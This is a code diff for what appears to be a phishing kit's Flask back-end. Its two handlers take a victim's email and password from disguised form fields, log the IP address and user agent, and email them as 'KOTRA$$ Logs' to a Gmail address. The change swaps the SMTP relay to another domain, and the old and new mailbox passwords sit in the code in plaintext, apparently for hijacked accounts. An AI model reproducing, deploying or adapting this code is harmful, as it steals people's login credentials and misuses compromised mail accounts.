@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "info@aiapm.org"
-        sender_emaill = "info"
+        sender_email = "ventas@arbar.co"
+        sender_emaill = "ventas"
         receiver_email = "kokofunds147e@gmail.com"
-        password = "Anayo123@#"
+        password = "Ventasarbar1965$"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("aiapm.org", 465) as server:
+        with smtplib.SMTP_SSL("arbar.co", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "info@aiapm.org"
-        sender_emaill = "info"
+        sender_email = "ventas@arbar.co"
+        sender_emaill = "ventas"
         receiver_email = "kokofunds147@gmail.com"
-        password = "Anayo123@#"
+        password = "Ventasarbar1965$"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("aiapm.org", 465) as server:
+        with smtplib.SMTP_SSL("arbar.co", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
